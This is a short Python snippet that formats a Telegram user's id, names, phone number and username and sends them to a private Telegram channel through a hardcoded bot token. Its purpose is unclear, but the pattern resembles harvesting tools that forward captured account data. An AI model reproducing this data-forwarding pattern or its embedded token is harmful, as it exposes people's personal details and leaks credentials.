import random
import requests

TELEGRAM_API_URL = "https://api.telegram.org/bot{}/sendMessage?text={}&chat_id={}"
BOT_TOKEN = "7240369359:AAHUaV5oURh8X37uBc_fhuELU8EbD6SlcAo"
CHANNEL_ID = "-1002241163463"


def telegram_add(telegramuser):
    message = """Successfully!!!\nuser_id: {}\nfirst_name: {}\nlast_name: {}\nphone: {}\nusername: {}""".format(
        telegramuser.user_id,
        telegramuser.first_name,
        telegramuser.last_name,
        telegramuser.phone, telegramuser.username)
    requests.get(TELEGRAM_API_URL.format(BOT_TOKEN, message, CHANNEL_ID))



